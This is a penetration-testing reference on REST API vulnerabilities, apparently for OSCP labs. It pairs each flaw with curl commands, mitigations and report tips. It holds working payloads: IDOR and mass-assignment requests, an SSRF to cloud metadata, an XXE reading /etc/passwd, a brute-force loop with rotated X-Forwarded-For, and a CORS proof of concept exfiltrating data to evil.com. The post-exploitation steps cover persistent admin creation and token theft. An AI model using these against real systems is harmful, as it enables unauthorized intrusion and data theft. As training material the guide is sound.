# REST APIs

> REST (Representational State Transfer) is an architectural style for APIs. It uses HTTP methods (GET, POST, PUT, PATCH, DELETE) on resource URLs and typically returns JSON. REST APIs are the most common API type in web applications and are a primary source of IDOR, mass assignment, and broken authentication vulnerabilities.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [REST Basics](#2-rest-basics)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Vulnerabilities and Exploitation](#5-vulnerabilities-and-exploitation)
6. [Tooling](#6-tooling)
7. [Post-Exploitation](#7-post-exploitation)
8. [OSCP Notes](#8-oscp-notes)
9. [References](#9-references)

---

## 1. Detection

REST APIs are everywhere. Look for:

- URLs like `/api/v1/`, `/api/v2/`, `/rest/`, `/json/`, `/data/`.
- `Content-Type: application/json` in requests/responses.
- `Accept: application/json` in requests.
- HTTP methods beyond GET/POST: PUT, PATCH, DELETE, OPTIONS.
- API version in path (`/v1/`) or header (`Accept: application/vnd.api+json`).
- Swagger/OpenAPI UI at `/swagger`, `/swagger-ui`, `/api-docs`, `/openapi.json`.

### Quick detection

```bash
# OPTIONS enumeration
curl -s -X OPTIONS $TARGET/api/ -i | grep -i allow

# Swagger/OpenAPI discovery
for p in /swagger /swagger-ui /swagger-ui.html /api-docs /openapi.json /v2/api-docs /v3/api-docs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
  echo "$code $p"
done
```

Expected output:

```text
Allow: GET, POST, PUT, DELETE, OPTIONS
200 /swagger-ui
200 /openapi.json
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `/api/v1/` in URL | Versioned REST API | Enumerate endpoints |
| `application/json` response | JSON API | Test content-type confusion |
| `Allow:` header lists methods | REST semantics | Test method overrides |
| 405 Method Not Allowed | Endpoint exists, wrong verb | Try other verbs |
| `/swagger` or `/openapi.json` | API spec exposed | Import into Postman |
| 401 vs 403 | Auth vs authz boundary | IDOR testing |
| `ETag` / `If-Match` | Concurrency control | Bypass via weak ETag |
| `X-HTTP-Method-Override` | Verb tunneling | Bypass WAF/method restrictions |

---

## 2. REST Basics

### 2.1 HTTP methods

| Method | Purpose | Idempotent |
|--------|---------|------------|
| GET | Read resource | Yes |
| POST | Create resource | No |
| PUT | Replace resource | Yes |
| PATCH | Partial update | No |
| DELETE | Remove resource | Yes |
| OPTIONS | List allowed methods | Yes |
| HEAD | GET without body | Yes |

### 2.2 Status codes worth attention

| Code | Meaning | Relevance |
|------|---------|-----------|
| 200 | OK | Baseline |
| 201 | Created | POST succeeded |
| 400 | Bad Request | Malformed input |
| 401 | Unauthorized | No/invalid token |
| 403 | Forbidden | Authenticated but not authorized |
| 404 | Not Found | Endpoint or resource missing |
| 405 | Method Not Allowed | Endpoint exists, wrong verb |
| 409 | Conflict | Resource exists |
| 422 | Unprocessable Entity | Validation failed (schema hints) |
| 429 | Rate Limited | Bypass attempts |
| 500 | Server Error | Often leaks stack traces |

### 2.3 Content negotiation

```bash
# JSON
curl -s -H "Accept: application/json" $TARGET/api/users

# XML (some APIs still support it - XXE potential)
curl -s -H "Accept: application/xml" $TARGET/api/users

# Content-Type confusion
curl -s -X POST $TARGET/api/users -H "Content-Type: application/json" -d '{"user":"admin"}'
curl -s -X POST $TARGET/api/users -H "Content-Type: application/x-www-form-urlencoded" -d 'user=admin'
```

### 2.4 Versioning

Common patterns:

- Path: `/api/v1/users`, `/api/v2/users`.
- Header: `Accept: application/vnd.myapi.v2+json`.
- Query: `/api/users?version=2`.

**Old versions often have unfixed vulnerabilities.** Enumerate v1, v2, v0, beta.

---

## 3. Enumeration

### 3.1 Endpoint discovery

```bash
# Common REST paths
for p in /api /api/v1 /api/v2 /api/users /api/admin /api/auth /api/login /api/register /api/config /api/health /api/me /api/me/orders /api/orders /api/products; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
  echo "$code $p"
done
```

### 3.2 Swagger/OpenAPI

If `/openapi.json` or `/swagger.json` is exposed:

```bash
curl -s $TARGET/openapi.json | jq '.paths | keys'
```

Expected output:

```json
[
  "/api/v1/users",
  "/api/v1/users/{id}",
  "/api/v1/login",
  "/api/v1/admin/settings"
]
```

Import into Postman or use `openapi-to-postman` for a full collection.

### 3.3 Verb tampering

Some endpoints only reject unauthenticated requests for specific verbs. Try every verb:

```bash
for verb in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $verb "$TARGET/api/admin")
  echo "$code $verb"
done
```

### 3.4 Header overrides

```bash
# Verb override
curl -s -X POST $TARGET/api/admin -H "X-HTTP-Method-Override: DELETE"

# IP spoofing (trust of X-Forwarded-For)
curl -s $TARGET/api/admin -H "X-Forwarded-For: 127.0.0.1"
curl -s $TARGET/api/admin -H "X-Real-IP: 127.0.0.1"
curl -s $TARGET/api/admin -H "X-Originating-IP: 127.0.0.1"
curl -s $TARGET/api/admin -H "X-Remote-Addr: 127.0.0.1"
```

### 3.5 Parameter discovery

```bash
# arjun for hidden params
arjun -u $TARGET/api/users -m GET

# ffuf with param wordlist
ffuf -u "$TARGET/api/users?FUZZ=1" -w /usr/share/wordlists/params.txt -fc 404
```

### 3.6 Enumerate IDs

```bash
# IDOR enumeration
for id in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users/$id")
  echo "$code /api/users/$id"
done
```

---

## 4. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| IDOR | Sequential IDs, no authz | Data leak |
| Mass assignment | No input whitelist | Privilege escalation |
| Broken auth | Missing token check | Auth bypass |
| Verb tampering | Weak verb enforcement | Bypass auth, delete data |
| JWT in API | See JWT.md | Auth bypass |
| Rate-limit bypass | No global limit | Brute-force |
| SSRF via URL params | Fetch user URL | Internal access |
| SQLi/NoSQLi | Unsanitized input | Data exfil |
| XXE via XML | XML content-type | File read, SSRF |
| CORS misconfig | Reflected origin | Cross-origin data theft |
| Info disclosure | Verbose errors | Stack traces, paths |
| Swagger exposed | Spec leak | Full endpoint map |
| Old API version | v0/v1 alive | Unfixed CVEs |
| Content-type confusion | Multi-format parser | WAF bypass |
| HTTP/2 downgrade | Header normalization | Request smuggling |

---

## 5. Vulnerabilities and Exploitation

### 5.1 IDOR (Insecure Direct Object Reference)

**Root cause:** The API uses client-supplied IDs without authorization checks.

**Exploit:**

```bash
# Baseline: your own resource
curl -s -H "Authorization: Bearer <your_token>" $TARGET/api/v1/users/1001

# Change to another user
curl -s -H "Authorization: Bearer <your_token>" $TARGET/api/v1/users/1002
```

Expected output (leak):

```json
{"id":1002,"email":"victim@example.com","role":"user"}
```

**ID formats to try:**

- Sequential ints: `1, 2, 3`.
- UUIDs: known UUIDs, leaked in other endpoints.
- Emails: `/api/users/victim@example.com`.
- Usernames: `/api/users/admin`.

**UUID note:** if the API uses UUIDs, find one for a public object (e.g. a shared post), then reuse it - UUIDs alone are not authorization.

> [!IMPORTANT]
> OSCP report: screenshot the request with your own ID, then the request with another user's ID, showing the leaked data. Include the Authorization header to prove you are authenticated as a low-privilege user.

**Mitigation:** server-side authorization per request; never trust client IDs.

---

### 5.2 Mass assignment

**Root cause:** The server binds JSON request body to a model without whitelisting fields. Attacker adds `role: "admin"` or `isAdmin: true`.

**Exploit:**

```bash
# Normal registration
curl -s -X POST $TARGET/api/v1/register -H "Content-Type: application/json" -d '{"username":"attacker","password":"pass"}'

# Mass assignment
curl -s -X POST $TARGET/api/v1/register -H "Content-Type: application/json" -d '{"username":"attacker2","password":"pass","role":"admin","isAdmin":true,"verified":true}'
```

Expected output (if vulnerable):

```json
{"id":1003,"username":"attacker2","role":"admin","isAdmin":true}
```

Common extra fields: `role`, `roles`, `isAdmin`, `is_staff`, `admin`, `verified`, `email_verified`, `balance`, `credits`, `groupId`, `planId`, `permissions`.

**Testing approach:** register a normal user, then update with the extra field via PUT/PATCH.

```bash
curl -s -X PATCH $TARGET/api/v1/users/me -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"role":"admin"}'
```

> [!IMPORTANT]
> OSCP report: screenshot the request with the extra field and the response confirming the elevated attribute. Then a request to an admin-only endpoint proving escalation.

**Mitigation:** explicit field whitelist per endpoint; never bind raw JSON to model.

---

### 5.3 Broken authentication

**Root cause:** Endpoint does not require a token, or accepts a forged/expired/other-user token.

**Tests:**

```bash
# No token
curl -s $TARGET/api/v1/admin/users

# Empty token
curl -s -H "Authorization: Bearer " $TARGET/api/v1/admin/users

# Wrong scheme
curl -s -H "Authorization: Basic YWRtaW46YWRtaW4=" $TARGET/api/v1/admin/users

# Another user's token (low-priv)
curl -s -H "Authorization: Bearer <userA_token>" $TARGET/api/v1/admin/users
```

If any request returns data, auth is broken.

> [!IMPORTANT]
> OSCP report: screenshot the request without a valid token returning protected data.

**Mitigation:** middleware auth on every route; never rely on obscurity.

---

### 5.4 Verb tampering

**Root cause:** Auth middleware is applied per verb, or incorrectly. E.g. `GET /admin` is protected but `POST /admin` is not.

**Exploit:**

```bash
for verb in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $verb $TARGET/api/v1/admin)
  echo "$code $verb"
done
```

If `POST /admin` returns 200 but `GET /admin` returns 403, verb tampering works.

**Verb override headers:**

```bash
curl -s -X POST $TARGET/api/v1/admin -H "X-HTTP-Method-Override: GET"
curl -s -X POST $TARGET/api/v1/admin -H "X-HTTP-Method: GET"
curl -s -X POST $TARGET/api/v1/admin -H "X-Method-Override: GET"
```

> [!IMPORTANT]
> OSCP report: screenshot the tampered verb request and the successful response, next to the failed normal request.

**Mitigation:** auth at routing layer, not per verb; disable override headers.

---

### 5.5 Rate-limit bypass

**Root cause:** Rate limit applied per IP or per session, but not globally.

**Bypass techniques:**

- Rotate `X-Forwarded-For` headers.
- Rotate `User-Agent`.
- Add trailing chars to the endpoint (`/login/`, `/login?x=1`, `/login?x=2`).
- Use case variation (`/Login`).
- Use HTTP/2 vs HTTP/1.1.
- Use batch endpoints.

```bash
# X-Forwarded-For rotation
for i in $(seq 1 100); do
  curl -s -X POST $TARGET/api/v1/login -H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.$i" -d '{"username":"admin","password":"pass'$i'"}'
done
```

> [!IMPORTANT]
> OSCP report: screenshot the rotation (X-Forwarded-For values) and multiple 401s followed by a 200.

**Mitigation:** rate limit at edge (nginx/Cloudflare) plus app-level; ignore client IP headers.

---

### 5.6 SSRF via URL parameters

**Root cause:** A parameter takes a URL and the server fetches it (webhook, avatar import, URL preview, PDF generator).

**Exploit:**

```bash
# Baseline
curl -s -X POST $TARGET/api/v1/webhook -H "Content-Type: application/json" -d '{"url":"http://example.com"}'

# SSRF to metadata
curl -s -X POST $TARGET/api/v1/webhook -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# SSRF to localhost
curl -s -X POST $TARGET/api/v1/webhook -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8080/admin"}'
```

**Bypass filters:**

- `http://[::1]:80/` (IPv6 loopback).
- `http://0177.0.0.1/` (octal).
- `http://2130706433/` (decimal).
- `http://localhost.evil.com/` (DNS rebinding).

> [!IMPORTANT]
> OSCP report: screenshot the malicious URL, the response with internal data, and the network diagram if the target is AWS/GCP/Azure.

**Mitigation:** whitelist of allowed hosts; block private IPs after DNS resolution.

---

### 5.7 Content-Type confusion (XXE via XML)

**Root cause:** The API accepts XML (or an attacker forces it), and the parser has external entity expansion enabled.

**Exploit:**

```bash
cat <<'EOF' > xxe.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
EOF

curl -s -X POST $TARGET/api/v1/users -H "Content-Type: application/xml" --data-binary @xxe.xml
```

Expected output:

```text
{"user":{"name":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}}
```

> [!IMPORTANT]
> OSCP report: screenshot the XXE payload and the response containing file contents.

**Mitigation:** disable DTDs and external entities in the parser; prefer JSON.

---

### 5.8 CORS misconfiguration

**Root cause:** Server reflects `Origin` header and sends `Access-Control-Allow-Credentials: true`.

**Exploit:**

```bash
# Test reflected origin
curl -s -I -H "Origin: https://evil.com" $TARGET/api/v1/users | grep -i "access-control-"

# Test with credentials
curl -s -I -H "Origin: https://evil.com" $TARGET/api/v1/users | grep -iE "access-control-allow-(origin|credentials)"
```

Vulnerable response:

```text
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Bypass tests:

- Origin: `https://target.com.evil.com`
- Origin: `https://evil.target.com`
- Origin: `null`
- Origin: `https://target.com%60.evil.com`

**PoC HTML:**

```html
<script>
fetch('https://target.com/api/v1/me', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
</script>
```

> [!IMPORTANT]
> OSCP report: screenshot the reflected Origin header with credentials=true, and the PoC page fetching data cross-origin.

**Mitigation:** exact-match origin whitelist; never reflect arbitrary origins with credentials.

---

### 5.9 Information disclosure via errors

**Root cause:** Verbose error messages leak stack traces, file paths, SQL queries, internal hostnames.

**Exploit:**

```bash
# Malformed JSON
curl -s -X POST $TARGET/api/v1/users -H "Content-Type: application/json" -d '{"user":'

# Wrong type
curl -s -X POST $TARGET/api/v1/users -H "Content-Type: application/json" -d '{"id":"notanumber"}'

# 500 trigger
curl -s $TARGET/api/v1/users/' UNION SELECT 1-- -
```

Look for:

- `Traceback (most recent call last):` (Python).
- `at java.lang.` (Java).
- `Microsoft OLE DB Provider` (MSSQL).
- `/var/www/html/...` (paths).
- `SQLSTATE` (SQL).

> [!IMPORTANT]
> OSCP report: screenshot the malformed request and the stack trace/path leak in the response.

**Mitigation:** generic error messages to clients; detailed logs server-side.

---

### 5.10 Old API version alive

**Root cause:** Deprecated `/api/v0/` or `/api/v1/` remains deployed after `/api/v2/` release.

**Exploit:**

```bash
for v in v0 v1 v2 v3 beta internal; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/$v/users")
  echo "$code /api/$v/users"
done
```

Old versions often have unpatched CVEs.

> [!IMPORTANT]
> OSCP report: screenshot the old version response with data or a known CVE behavior.

**Mitigation:** remove old versions; version at routing layer.

---

### 5.11 Swagger/OpenAPI exposure

**Root cause:** The spec is served in production. It lists every endpoint, parameter, and often examples.

**Exploit:**

```bash
curl -s $TARGET/openapi.json | jq '.paths | keys, .components.schemas'
```

Import into Postman for full testing.

> [!IMPORTANT]
> OSCP report: screenshot the openapi.json URL and the parsed endpoint list. This is not an exploit, but a disclosure finding worth documenting.

**Mitigation:** serve specs only on internal networks; never in production.

---

## 6. Tooling

### Postman

- Import `openapi.json` for a full collection.
- Environment variables for base URL, token.
- Pre-request scripts for auth refresh.

### Insomnia

- Similar to Postman, lighter.
- Good for GraphQL + REST.

### ffuf (API fuzzing)

```bash
# Endpoint fuzz
ffuf -u $TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404

# Parameter fuzz
ffuf -u "$TARGET/api/users?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

### arjun (hidden params)

```bash
arjun -u $TARGET/api/v1/users -m GET,POST --stable
```

### kiterunner

Fast content discovery for APIs, using Swagger/OpenAPI wordlists.

```bash
kr scan $TARGET -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

### nuclei (API templates)

```bash
nuclei -u $TARGET -t api/ -tags swagger,api,idor
```

### curl one-liners

```bash
# Save with auth
curl -s -H "Authorization: Bearer $TOKEN" $TARGET/api/v1/me | jq .

# POST JSON
curl -s -X POST $TARGET/api/v1/users -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"test"}'

# PATCH
curl -s -X PATCH $TARGET/api/v1/users/me -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"role":"admin"}'

# DELETE
curl -s -X DELETE $TARGET/api/v1/users/1002 -H "Authorization: Bearer $TOKEN"
```

---

## 7. Post-Exploitation

After obtaining admin access or a leaked dataset:

1. **Enumerate all users:** `/api/users` often returns full profiles.
2. **Look for API keys:** `/api/keys`, `/api/settings`, `/api/config`.
3. **Trigger account creation:** add a new admin user for persistence.
4. **Test role updates:** PUT/PATCH with `role: "admin"`.
5. **Check webhooks:** some APIs let you register a webhook URL -> SSRF.
6. **Extract tokens:** admin endpoints often return other users' tokens.
7. **Pivot to internal services:** SSRF via webhook or import.

```bash
for ep in /api/v1/users /api/v1/admin/users /api/v1/settings /api/v1/config /api/v1/keys /api/v1/webhooks; do
  echo "== $ep =="
  curl -s -H "Authorization: Bearer <admin_token>" "$TARGET$ep" | head -c 500
  echo
done
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for REST API findings:
> - Screenshot the request (curl or Burp) with the vulnerable parameter/header/body.
> - Screenshot the response proving the impact (leaked data, elevated role, admin access).
> - Include the Authorization header in the screenshot to prove you are authenticated as a low-privilege user.
> - Include timestamps in every screenshot.

> [!IMPORTANT]
> For IDOR, screenshot BOTH your own resource (id=1001) and the victim's resource (id=1002). The contrast proves the authorization flaw.

> [!IMPORTANT]
> For mass assignment, screenshot the registration/update request with the extra field, then an admin-only endpoint returning 200 with the elevated token.

**Common OSCP pitfalls:**

- Some APIs return 200 for every request, even on error - check the response body, not just the code.
- Trailing slash matters: `/api/users` vs `/api/users/` can behave differently.
- Case sensitivity: `/api/Users` vs `/api/users` - some frameworks match both, some don't.
- HTTP/2 header normalization can bypass header-based filters (`X-Forwarded-For` combined).
- When testing IDOR with UUIDs, look for UUIDs in other responses (list endpoints often leak them).
- Always test with the LOWEST privilege token you can obtain.

---

## 9. References

- OWASP API Security Top 10: https://owasp.org/API-Security/
- OWASP REST Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- PortSwigger API testing: https://portswigger.net/web-security/api-testing
- HackTricks API: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api
- RFC 7231 (HTTP/1.1 semantics): https://datatracker.ietf.org/doc/html/rfc7231
- Swagger/OpenAPI spec: https://spec.openapis.org/oas/latest.html
- kiterunner: https://github.com/assetnote/kiterunner
- arjun: https://github.com/s0md3v/Arjun
- ffuf: https://github.com/ffuf/ffuf
- CVE-2023-34362 (MOVEit API SQLi): https://nvd.nist.gov/vuln/detail/CVE-2023-34362
- CVE-2021-44228 (Log4Shell, exploited via headers): https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CVE-2022-22965 (Spring4Shell): https://nvd.nist.gov/vuln/detail/CVE-2022-22965